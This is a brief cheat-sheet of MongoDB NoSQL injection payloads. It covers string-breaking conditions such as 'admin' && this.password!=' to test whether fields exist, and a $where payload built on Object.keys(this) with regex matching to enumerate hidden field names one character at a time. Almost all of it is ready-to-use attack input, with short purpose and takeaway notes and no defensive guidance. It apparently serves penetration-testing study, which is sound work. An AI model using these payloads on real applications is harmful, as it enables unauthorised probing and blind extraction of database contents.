# Field Enumeration Payloads

## Check Whether a Field Exists

### Existing Field

```text
admin' && this.username!='
```

---

### Suspected Field

```text
admin' && this.password!='
```

---

### Non-Existing Field

```text
admin' && this.foo!='
```

---

## Enumerate Field Names

```text
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

---

## Enumerate Different Fields

Increment the array index:

```text
Object.keys(this)[1]
```

```text
Object.keys(this)[2]
```

```text
Object.keys(this)[3]
```

Continue increasing the index until all fields have been identified.

---

# Purpose

These payloads determine:

- Whether a field exists.
- The names of hidden fields.
- The order of fields within MongoDB documents.

---

# Key Takeaways

- `Object.keys(this)` enables field enumeration.
- Responses are compared using boolean conditions.
- Hidden fields can be extracted one character at a time.